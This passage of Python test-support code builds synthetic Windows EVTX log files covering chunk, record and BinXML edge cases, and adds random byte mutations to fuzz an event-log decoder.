    chunk.add(record_id, when, lambda _start: b"\x0f\x01\x01\x00\x00" + b"\x00" * (4 + pad))
    record_id += 1
    position = len(chunk.data)
    # Instance at position+28; count at +38; descriptors from +42 up to the chunk end.
    count = (CHUNK_SIZE - 2 - (position + 42)) // 4 + 1
    body_length = CHUNK_SIZE - position - 28
    body = b"\x0f\x01\x01\x00\x0c\x01\x00\x00\x00\x00" + struct.pack("<II", template_offset, count)
    chunk.add(record_id, when, lambda _start: body + b"\x01" * (body_length - len(body)), limit=CHUNK_SIZE)
    return chunk.finish()


def ansi_korean_event(record_id: int, when: int) -> Event:
    return Event(record_id, when, provider="Synthetic-Ansi", event_id=6, data=[("Ansi", ansi("한글 ANSI".encode("cp949"))), ("After", wstr("ok"))])


def surrogate_ref_payload(chunk: Chunk, record_id: int, when: int) -> Callable[[int], bytes]:
    tree = el(
        "Event",
        children=[
            el("System", children=[el("Channel", children=[Text("Surrogate")]), el("EventRecordID", children=[Inline(0x0A, struct.pack("<Q", record_id))])]),
            el("EventData", children=[el("Data", attrs=[("Name", Text("Ref"))], children=[CharRef(0xD800), Text("x")])]),
        ],
    )
    return direct_payload(chunk, tree)


def build_edge_corpus() -> dict[str, bytes]:
    """name -> EVTX bytes covering the chunk/record/BinXML edge cases."""
    rng = random.Random(7)
    corpus: dict[str, bytes] = {}
    when = filetime(BASE_TIME, 1234567)

    # 1. Multi-chunk mixed events, slack (stale + live-id copies), non-ASCII, 7-digit times.
    corpus["multi-chunk-slack.evtx"] = file_bytes(list(iter_mixed_chunks(420, seed=3, slack_per_chunk=3, first_record_id=1001)))

    # 2. Inactive chunks (declared count below the chunks present) + truncated last chunk.
    chunks = list(iter_mixed_chunks(300, seed=4, slack_per_chunk=1))
    corpus["inactive-chunks.evtx"] = file_bytes(chunks, declared_chunks=max(1, len(chunks) - 2))
    whole = file_bytes(chunks)
    corpus["truncated-mid-chunk.evtx"] = whole[: len(whole) - CHUNK_SIZE // 2 - 333]
    corpus["declared-beyond-data.evtx"] = file_bytes(chunks[:2], declared_chunks=5)

    # 3. Value types, Data name edge cases, tokens, sections, nested BinXml, decoder errors.
    chunk = Chunk()
    record_id = 1
    for factory in (kitchen_sink_event, user_data_event, processing_error_event, odd_system_event):
        add_event(chunk, factory(record_id, when + record_id))
        record_id += 1
    add_event(chunk, nested_event(chunk, record_id, when))
    record_id += 1
    add_event(chunk, nested_event(chunk, record_id, when + 3))
    record_id += 1
    chunk.add(*token_tree_event(chunk, record_id, when + 9))
    record_id += 1
    chunk.add(record_id, when, deep_event(chunk, record_id, when, 40))
    record_id += 1
    for kind in (
        "truncated-substitution",
        "template-out-of-bounds",
        "too-many-substitutions",
        "name-out-of-bounds",
        "no-root",
        "empty",
    ):
        chunk.add(record_id, when, broken_payload(kind))
        record_id += 1
    add_event(chunk, short_integer_event(record_id, when))
    record_id += 1
    add_event(chunk, kitchen_sink_event(record_id, when - 1))
    record_id += 1
    add_slack_event(chunk, kitchen_sink_event(record_id + 100, when))
    chunk.garbage(b"\xe5" * 40 + b"**\x00\x00" + struct.pack("<I", 8) + b"\xe5" * 40 + b"**\x00\x00" + struct.pack("<I", 4000) + b"\x00" * 64)
    corpus["value-types-and-tokens.evtx"] = file_bytes([chunk.finish()], next_record_id=record_id + 1)

    # 4. Chunks the Rust decoder hands back to Python (non-ASCII ANSI, lone surrogate
    #    reference, nesting beyond its depth bound) between ordinary records.
    fallback_chunks = []
    for variant in ("ansi", "surrogate", "deep"):
        chunk = Chunk()
        first = 1000 * (len(fallback_chunks) + 1)
        add_event(chunk, logon_event(first, when + 1, rng))
        add_event(chunk, logon_event(first + 1, when + 2, rng))
        if variant == "ansi":
            add_event(chunk, ansi_korean_event(first + 2, when + 3))
        elif variant == "surrogate":
            chunk.add(first + 2, when + 3, surrogate_ref_payload(chunk, first + 2, when + 3))
        else:
            chunk.add(first + 2, when + 3, deep_event(chunk, first + 2, when + 3, 230))
        add_event(chunk, logon_event(first + 3, when + 4, rng))
        add_event(chunk, kitchen_sink_event(first + 4, when + 5))
        fallback_chunks.append(chunk.finish())
    corpus["python-fallback-chunks.evtx"] = file_bytes(fallback_chunks)

    # 5. Names never shared (every NameString inline) and an empty file/header-only file.
    chunk = Chunk(share_names=False)
    for offset in range(20):
        add_event(chunk, logon_event(5000 + offset, when + offset, rng))
    corpus["inline-names.evtx"] = file_bytes([chunk.finish()])
    corpus["descriptor-index-error.evtx"] = file_bytes([descriptor_index_error_chunk(when)])
    corpus["header-only.evtx"] = file_bytes([])
    return corpus


def mutate_chunks(blob: bytes, rng: random.Random, *, mutations: int) -> bytes:
    """Random byte corruption inside the record area of each chunk (fuzzed decoder input)."""
    data = bytearray(blob)
    offset = 4096
    while offset + CHUNK_HEADER_SIZE < len(data):
        if data[offset : offset + 8] == b"ElfChnk\x00":
            free_space = struct.unpack_from("<I", data, offset + 48)[0] or CHUNK_SIZE
            end = min(len(data), offset + max(CHUNK_HEADER_SIZE + 1, free_space))
            for _ in range(mutations):
                position = rng.randrange(offset + CHUNK_HEADER_SIZE, end)
                data[position] = rng.choice((0x00, 0x01, 0x02, 0x04, 0x05, 0x06, 0x0C, 0x0D, 0x21, 0x41, 0x81, 0xFF, rng.randrange(256)))
        offset += CHUNK_SIZE
    return bytes(data)
